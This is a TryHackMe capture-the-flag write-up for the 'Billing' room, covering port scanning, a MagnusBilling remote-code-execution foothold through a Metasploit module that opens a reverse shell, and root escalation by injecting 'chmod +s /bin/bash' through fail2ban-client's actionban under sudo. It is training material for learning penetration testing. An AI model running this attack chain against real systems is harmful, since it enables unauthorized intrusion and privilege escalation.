🧾 TryHackMe — Billing Room Write-up (Walkthrough)

This walkthrough captures my complete methodology for tackling the Billing room on TryHackMe. It includes initial assumptions, investigative detours, dead ends, and ultimately the correct exploit paths. I’ve intentionally preserved missteps to illustrate a realistic, thought-driven approach — useful both for personal review and for others learning the process.

⚠️ Note: This write-up avoids flag disclosure and assumes the reader has prior CTF experience. Brute-forcing is explicitly out of scope.
🧠 Objective

    Gain a reverse shell, identify the user, and escalate privileges to root.

🛰 Enumeration Phase
🔎 Full Port Scan

nmap -p- <IP>

Identified open ports:

    22: SSH (potential post-exploitation or initial access vector via creds)

    80: HTTP (likely webapp)

    3306: MySQL (check for remote access/config issues)

    5038: Unknown (initial guess: Magic Leap MLDB / Asterisk AMI)

A follow-up version detection scan:

nmap -sV -p22,80,3306,5038 <IP>

Result: Asterisk service detected on 5038 — intriguing.
🌐 Web Application Analysis

Navigating to port 80 presents a basic login interface. Source code inspection didn’t reveal anything immediately useful.

🔍 Suspected usage of MagnusBilling, possibly indicating either a default credential leak or exploitable prebuilt platform.
🛠️ Exploring Port 5038

Tested access via:

    Browser: no frontend.

    Telnet: successful basic connection.

No concrete exploit found on ExploitDB. However, Metasploit revealed a potential exploit module for MagnusBilling.
🧨 Gaining Access — Initial Foothold
🧰 Using Metasploit (msfconsole)

use exploit/linux/http/magnusbilling_rce
set RHOSTS <IP>
set LHOST <Your_Tun0_IP>
run

🔥 Result: Reverse shell established as asterisk.
📁 Post-Exploitation (User Flag)

Explored /home/ directory — discovered a user magnus. The user.txt flag was easily accessible.

🧠 Observation: Sometimes, identifying and leveraging prebuilt, outdated software (like MagnusBilling) provides straightforward access paths.
🔐 Privilege Escalation (Root Flag)
🔎 Initial Enumeration

Found fail2ban-client executable permitted via sudo:

sudo -l

➕ Useful GTFOBins entry exists for fail2ban-client.

Also uploaded and ran linpeas.sh to assist in deeper enumeration.
⚙️ Strategy: Abusing Fail2ban

The room blocks remote MySQL access — potentially due to dynamic IP banning.

Hypothesis: If we can unban or control the ban process, we can trigger commands with root privileges.

sudo /usr/bin/fail2ban-client status

Returned multiple jails including:

    asterisk-iptables

    mbilling_login

    sshd, etc.

Tried globally unbanning IPs via:

sudo /usr/bin/fail2ban-client set <jail_name> unban --all

🧠 Eventually pivoted to an actionban command injection.
🛠️ Exploiting actionban

Injected payload via:

sudo /usr/bin/fail2ban-client set asterisk-iptables actionban "chmod +s /bin/bash"

Then triggered the jail ban:

sudo /usr/bin/fail2ban-client set asterisk-iptables banip 8.8.8.8

✔️ Result: /bin/bash now has the SUID bit set.

Spawned root shell with:

bash -p

Grabbed root.txt.
📌 Lessons Learned

    Enumeration is the key — from ports to software names, nothing is arbitrary.

    Tools like Metasploit are powerful — but understanding what they exploit is more important.

    Fail2ban, often overlooked, is a serious privilege escalation vector when misconfigured.

    Working through errors and dead ends is part of the journey — documenting this is just as valuable as the solution.

📋 Management Summary

    Initial Vector: MagnusBilling RCE (Metasploit module)

    User: asterisk → found magnus

    Privilege Escalation: Fail2ban actionban abuse for SUID bash

    Tooling Used: nmap, msfconsole, linpeas, fail2ban-client

    Takeaway: Smart misconfiguration chaining can replace complex exploit chains.

If you’re aiming to go beyond CTFs into real-world pentesting, this room is an excellent reminder: Outdated software and simple sudo misconfigs are still powerful.
